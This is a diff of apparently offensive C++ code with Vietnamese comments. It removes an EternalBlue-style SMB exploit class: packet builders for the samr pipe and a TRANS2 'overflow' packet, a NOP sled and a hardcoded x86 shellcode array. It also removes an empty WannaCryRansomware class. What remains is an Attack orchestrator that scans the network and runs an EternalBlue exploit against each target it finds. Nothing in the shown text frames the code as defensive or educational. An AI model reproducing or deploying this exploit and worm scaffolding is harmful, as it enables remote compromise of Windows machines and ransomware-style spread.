-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0xA2; // SMB_COM_NT_CREATE_ANDX
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        header.tid = tid;
-        header.uid = uid;
-        AppendSMBHeader(packet, header);
-        
-        // NT Create parameters
-        packet.insert(packet.end(), {
-            0x18,                   // Word count
-            0xFF, 0x00,             // AndX command
-            0x00, 0x00,             // AndX offset
-            0x00, 0x00,             // Reserved
-            0x00, 0x02, 0x00, 0x00, // Name length
-            0x00, 0x00, 0x00, 0x00, // Flags
-            0x00, 0x00, 0x00, 0x00, // Root FID
-            0x00, 0x00, 0x02, 0x80, // Access mask
-            0x00, 0x00, 0x00, 0x00, // Allocation size
-            0x00, 0x00, 0x00, 0x00, // Attributes
-            0x00, 0x00, 0x00, 0x00, // Share access
-            0x00, 0x00, 0x00, 0x00, // Create disposition
-            0x00, 0x00, 0x00, 0x00, // Create options
-            0x00, 0x00, 0x00, 0x00, // Impersonation
-            0x00, 0x00, 0x00,       // Security flags
-            0x5C, 0x00,             // Byte count
-        });
-        
-        // Pipe name
-        const char* pipe_name = "\\samr";
-        packet.insert(packet.end(), pipe_name, pipe_name + strlen(pipe_name));
-        packet.push_back(0x00);
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
-
-    static bool TriggerBufferOverflow(SOCKET sock, uint16_t tid, uint16_t uid, uint16_t fid) {
-        std::cout << "   ↳ Triggering buffer overflow...\n";
-        
-        std::vector<uint8_t> overflow_packet = CreateOverflowPacket(tid, uid, fid);
-        
-        if (send(sock, (char*)overflow_packet.data(), overflow_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Overflow trigger failed\n";
-            return false;
-        }
-
-        // Không mong đợi response vì có thể crash service
-        Sleep(1000);
-        
-        std::cout << "   ✅ Buffer overflow triggered\n";
-        return true;
-    }
-
-    static std::vector<uint8_t> CreateOverflowPacket(uint16_t tid, uint16_t uid, uint16_t fid) {
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x32; // SMB_COM_TRANSACTION2
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        header.tid = tid;
-        header.uid = uid;
-        header.mid = 0x5000;
-        AppendSMBHeader(packet, header);
-        
-        // TRANS2 parameters với size lớn để trigger overflow
-        packet.insert(packet.end(), {
-            0x0F,                   // Word count
-            0x0C, 0x00,             // Total param count
-            0x00, 0x00,             // Total data count
-            0x01, 0x00,             // Max param count
-            0x00, 0x00,             // Max data count
-            0x00,                   // Max setup count
-            0x00,                   // Reserved
-            0x00, 0x00,             // Flags
-            0x00, 0x00, 0x00, 0x00, // Timeout
-            0x00, 0x00,             // Reserved
-            0x0C, 0x00,             // Param count
-            0x3C, 0x00,             // Param offset
-            0x00, 0x00,             // Data count
-            0x3C, 0x00,             // Data offset
-            0x01,                   // Setup count
-            0x00,                   // Reserved
-            0x00, 0x00,             // TRANS2 function
-            0x0E, 0x00,             // Byte count
-        });
-        
-        // Overflow payload - shellcode + padding
-        std::vector<uint8_t> payload = SHELLCODE;
-        payload.resize(0x1000, 0x90); // NOP sled
-        
-        packet.insert(packet.end(), payload.begin(), payload.end());
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
-
-    static bool ExecuteShellcode(SOCKET sock) {
-        std::cout << "   ↳ Executing shellcode payload...\n";
-        
-        // Gửi final packet để trigger shellcode execution
-        std::vector<uint8_t> trigger_packet = CreateShellcodeTriggerPacket();
-        
-        if (send(sock, (char*)trigger_packet.data(), trigger_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Shellcode trigger failed\n";
-            return false;
-        }
-
-        Sleep(2000);
-        std::cout << "   ✅ Shellcode execution completed\n";
-        return true;
-    }
-
-    static std::vector<uint8_t> CreateShellcodeTriggerPacket() {
-        // Packet đơn giản để trigger execution
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x1F});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x25; // SMB_COM_TRANSACTION
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        AppendSMBHeader(packet, header);
-        
-        // Minimal transaction data
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        return packet;
-    }
-
-    static void AppendSMBHeader(std::vector<uint8_t>& packet, const SMB_HEADER& header) {
-        packet.insert(packet.end(), header.protocol, header.protocol + 4);
-        packet.push_back(header.command);
-        
-        // Status (4 bytes)
-        for (int i = 0; i < 4; i++) {
-            packet.push_back((header.status >> (8 * i)) & 0xFF);
-        }
-        
-        packet.push_back(header.flags);
-        
-        // Flags2 (2 bytes)
-        packet.push_back(header.flags2 & 0xFF);
-        packet.push_back((header.flags2 >> 8) & 0xFF);
-        
-        // PID high (2 bytes)
-        packet.push_back(header.pid_high & 0xFF);
-        packet.push_back((header.pid_high >> 8) & 0xFF);
-        
-        // Signature (8 bytes)
-        packet.insert(packet.end(), header.signature, header.signature + 8);
-        
-        // Reserved (2 bytes)
-        packet.push_back(header.reserved & 0xFF);
-        packet.push_back((header.reserved >> 8) & 0xFF);
-        
-        // TID (2 bytes)
-        packet.push_back(header.tid & 0xFF);
-        packet.push_back((header.tid >> 8) & 0xFF);
-        
-        // PID (2 bytes)
-        packet.push_back(header.pid & 0xFF);
-        packet.push_back((header.pid >> 8) & 0xFF);
-        
-        // UID (2 bytes)
-        packet.push_back(header.uid & 0xFF);
-        packet.push_back((header.uid >> 8) & 0xFF);
-        
-        // MID (2 bytes)
-        packet.push_back(header.mid & 0xFF);
-        packet.push_back((header.mid >> 8) & 0xFF);
-    }
-
-    static std::vector<uint8_t> ReceiveSMBPacket(SOCKET sock) {
-        char buffer[4096];
-        int received = recv(sock, buffer, sizeof(buffer), 0);
-        
-        if (received == SOCKET_ERROR) {
-            return {};
-        }
-        
-        return std::vector<uint8_t>(buffer, buffer + received);
     }
 };
 
-
-class WannaCryRansomware {
-
-};
-
-// === Attack Orchestrator ===
 class Attack {
 public:
     static void Launch() {
         auto targets = NetworkRecon::Execute();
+        EternalBlue exploit;
         for (const auto& t : targets) {
-            EternalBlueExploit::ExploitTarget(t);
+            exploit.StartExploit(t);
         }
     }
 };
@@ -1042,17 +509,6 @@ public:
 std::atomic<int> NetworkRecon::scanned_count(0);
 std::atomic<int> NetworkRecon::target_count(0);
 
-const std::vector<uint8_t> EternalBlueExploit::SHELLCODE = {
-    0x31,0xd2,0xb2,0x30,0x64,0x8b,0x12,0x8b,0x52,0x0c,0x8b,0x52,0x1c,0x8b,0x42,0x08,
-    0x8b,0x72,0x20,0x8b,0x12,0x80,0x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,
-    0x8b,0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01,0xc7,0x31,0xed,0x8b,0x34,0xaf,0x01,
-    0xc6,0x45,0x81,0x3e,0x57,0x69,0x6e,0x45,0x75,0xf2,0x8b,0x7a,0x24,0x01,0xc7,0x66,
-    0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x68,0x79,
-    0x74,0x65,0x01,0x68,0x6b,0x65,0x6e,0x42,0x68,0x20,0x42,0x72,0x6f,0x89,0xe1,0xfe,
-    0x49,0x0b,0x31,0xc0,0x51,0x50,0xff,0xd7
-};
-
-// === Main ===
 int main() {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
